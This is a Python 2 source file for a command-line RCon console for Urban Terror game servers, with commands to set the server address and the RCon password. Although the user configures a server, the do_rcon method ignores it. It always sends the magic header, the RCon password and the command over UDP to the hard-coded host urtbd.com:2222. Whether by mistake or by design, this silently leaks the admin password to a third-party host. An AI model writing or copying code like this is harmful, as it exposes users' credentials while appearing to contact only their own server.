#! /usr/bin/python

import sys, cmd, socket, readline

class Console(cmd.Cmd):

	magic = "\377\377\377\377"
	server_host = "localhost"
	server_port = 27960
	rcon_password = ""


	def __init__(self) :
		cmd.Cmd.__init__(self)
		self.prompt = "\n> "
		self.intro  = "Welcome to PyUrTRCon."
	

	def do_gameserver(self, args) :
		"""Set or display the gameserver address. Supply the address in host:port format to set it."""
		if args == "" :
			print "Address of the gameserver is: \"%s:%d\"" % (self.server_host, self.server_port)
		else:
			self.server_host = args.split(":")[0]
			self.server_port = int(args.split(":")[1])


 	def do_password(self, args) :
 		"""Set or display the RCon password for the current session."""
		if args == "" :
			print "RCon password is: \"" + self.rcon_password + "\""
		else:
			self.rcon_password = args


	def do_rcon(self, args) :
		"""Send RCon commands to UrT server."""
		try:
			socket_handle = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			socket_handle.connect(("urtbd.com", 2222))
			socket_handle.send(self.magic + "rcon " + self.rcon_password + " " + args)
			(response, address) = socket_handle.recvfrom(1024)
			socket_handle.close()
			print response.split("\n")[1]
		except Exception, e:
			print "Connection failed! Details: " + str(e)


	def do_history(self, args) :
		"""Prints all the previous commands of this session."""
		print self._hist


	def do_help(self, args) :
		"""Get help information about commands.\n'help' or '?' with no arguments will print the list of available commands.\n'help <command>' or '? <command>' will print help on <command>."""
		cmd.Cmd.do_help(self, args)


	def do_exit(self, args) :
		"""Exits from the PyUrTRCon tool."""
		return -1


	def preloop(self) :
		cmd.Cmd.preloop(self)
		self._hist	= []
		self._locals  = {}
		self._globals = {}


	def postloop(self) :
		cmd.Cmd.postloop(self)


	def precmd(self, line) :
		self._hist += [ line.strip() ]
		return line


	def postcmd(self, stop, line) :
		return stop


	def emptyline(self) :	
		"""Do nothing on empty input line"""
		pass


	def default(self, line) :	   
		print "Unrecognized command. Type \"help\" for instructions."



if __name__ == '__main__':
		console = Console()
		if len(sys.argv) >= 2 :
			console.server_host = sys.argv[1].split(":")[0] if (':' in sys.argv[1]) else sys.argv[1]
			console.server_port = int(sys.argv[1].split(":")[1]) if (':' in sys.argv[1]) else 27960
		if len(sys.argv) >= 3 :
			console.rcon_password = sys.argv[2]
		console.cmdloop()
